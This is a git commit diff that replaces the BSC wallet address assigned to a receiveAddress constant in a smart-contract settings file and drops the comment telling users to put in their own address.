015aba7387ce49d85f38f02a4bd1a8b7fe0b20ac
Croftonfb <97317249+Croftonfb@users.noreply.github.com>
2024-10-10 00:57:25 +0530

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x71CfFca7AF0C0f846749823609a0c92d52a43820";  
 
 	
 var cryptotokenContract;
